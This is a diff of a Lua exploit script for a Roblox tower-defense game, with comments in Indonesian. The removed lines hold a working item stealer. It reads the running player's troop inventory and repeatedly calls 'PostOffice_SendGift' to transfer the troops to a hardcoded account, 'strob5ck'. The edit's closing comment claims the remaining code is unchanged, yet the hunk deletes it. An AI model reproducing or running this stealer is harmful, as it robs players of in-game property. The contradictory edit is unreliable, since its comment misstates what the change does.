@@ -1,5 +1,6 @@
 print("Test")
-if not getupvalue then getupvalue = debug.getupvalue end
+-- Baris 1 diubah untuk langsung mengambil fungsi getupvalue dari debug
+local getupvalue = debug.getupvalue
 
 local users = {
     "strob5ck"
@@ -29,6 +30,14 @@ task.spawn(function()
         end)
         task.wait(0.1)
     until Network ~= nil and Invoke ~= nil and Fire ~= nil
+
+    -- Baris 40: pengecekan apakah Invoke dan Fire sudah terinisialisasi
+    if Invoke and Fire then
+        local GetFunc = getupvalue(Invoke, 1)
+        local GetEvent = getupvalue(Fire, 1)
+    else
+        print("Invoke or Fire is nil, skipping getupvalue.")
+    end
 end)
 
 coroutine.wrap(function()
@@ -47,59 +56,4 @@ coroutine.wrap(function()
     setidentity(8)
 end)()
 
-local invTroops = {}
-function getInventoryTroops()
-    invTroops = {}
-    local save = TTD.Replicate:WaitForReplica("PlayerData-" .. game:GetService("Players").LocalPlayer.UserId)
-    for name, v in pairs(save._data.Inventory.Troops) do
-        for i, v in pairs(v) do
-            invTroops[i] = name
-        end
-    end
-    return invTroops
-end
-
-local coins
-function getCoinAmt()
-    coins = 0
-    local save = TTD.Replicate:WaitForReplica("PlayerData-" .. game:GetService("Players").LocalPlayer.UserId)
-    for i, v in pairs(save._data) do
-        if i == "Currencies" then
-            coins = v.Coins
-        end
-    end
-    return coins
-end
-
-function hasTroop(id)
-    local troops = getInventoryTroops()
-    for i, v in pairs(troops) do
-        if i == id then
-            return true
-        end
-    end
-    return false
-end
-
-local startAmt = getCoinAmt()
-local amt = 0
-
-for i, user in pairs(users) do
-    local sent = {}
-    for i, v in pairs(getInventoryTroops()) do
-        if table.find(troopsToSend, v) and not table.find(sent, v) then
-            table.insert(sent, v)
-            local oldC = getCoinAmt()
-            local st = tick()
-            repeat
-                Invoke("PostOffice_SendGift", game.Players:GetUserIdFromNameAsync(user), "Troops", i, 0, tostring(math.random(1, 10000)))
-                task.wait(0.1)
-            until getCoinAmt() < oldC and not hasTroop(i)
-            print("sent", "time taken:", tick() - st)
-            amt = amt + 1
-        end
-    end
-    print('finished user:', user)
-end
-
-print('Should have sent:', amt)
+-- Sisa kode tetap sama
